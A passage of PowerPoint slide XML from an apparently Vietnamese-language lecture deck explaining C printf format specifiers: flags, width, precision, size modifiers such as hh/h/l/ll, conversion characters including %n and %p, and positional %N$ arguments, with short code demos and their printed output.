                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>arg$ = %12$ (positional) | flags = - + space # 0 ' I</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>width = chiều rộng tối thiểu (* lấy từ arg)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>prec: Quy định độ chính xác hoặc số chữ số hiển thị.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>size: Quy định kích thước dữ liệu áp dụng</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>conv = Chọn kiểu dữ liệu của argument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TextBox 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="494892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Bộ conversion (glibc): 23 ký tự</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="71" name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1234440"/>
            <a:ext cx="10964880" cy="5167800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="45000" rIns="90000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr marL="457200" defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Chọn cách diễn giải và hiển thị giá trị của argument.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Số nguyên: %d, %i, %u, %x, %o</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Số thực: %f, %e, %g</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Ký tự / chuỗi: %c, %s</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Khác: %p (địa chỉ), %% (in dấu %), %n (ghi số ký tự đã in), %m (thông báo lỗi)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Ví dụ: %d và %x có thể hiển thị cùng một giá trị số theo hai cách khác nhau.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="127622"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>printf("%d",  255);  // 255</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="127622"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>printf("%x",  255);  // ff</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>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TextBox 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="477360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Size modifier = kiểu C của arg</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="73" name="TextBox 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="687600"/>
            <a:ext cx="10964880" cy="702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1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Quy định biến thể kiểu dữ liệu mà conversion xử lý.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>hh: char </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>h: short</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>l: long </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>ll: long long</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Ví dụ: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>    long int b = 0x123456789ABCDEF0LL;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Courier New"/>
              </a:rPr>
              <a:t>    printf("%lx\n", b);  // </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="00A933"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Courier New"/>
              </a:rPr>
              <a:t>123456789abcdef0</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Courier New"/>
              </a:rPr>
              <a:t>    printf("%x\n", b);  // </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="00A933"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Courier New"/>
              </a:rPr>
              <a:t>9abcdef0</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Courier New"/>
              </a:rPr>
              <a:t>    printf("%hx\n", b);  // </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="00A933"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Courier New"/>
              </a:rPr>
              <a:t>def0</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Courier New"/>
              </a:rPr>
              <a:t>    printf("%hhx\n", b);  // </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="00A933"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Courier New"/>
              </a:rPr>
              <a:t>f0</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2600" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1191"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="992"/>
              </a:spcAft>
            </a:pP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TextBox 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="10964880" cy="8150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Width &amp; Precision — code demo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75" name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1234440"/>
            <a:ext cx="10964880" cy="4347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3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>printf("[%5d][%-5d][%05d]\n", 42, 42, 42);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0B6623"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>[   42][42   ][00042]</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onsolas"/>
              </a:rPr>
              <a:t>printf("[%8.3s][%.4d][%.2f]\n", "hello", 42, 3.14159);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="0B6623"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>[     hel][0042][3.14]</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TextBox 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="274320"/>
            <a:ext cx="482184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Positional %N$ — code demo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77" name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1234440"/>
            <a:ext cx="6941520" cy="5088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201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="111111"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>Thông thường các specifiers sẽ đọc arg theo thứ tự.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="0" u="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:uFillTx/>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="457200">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="201"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
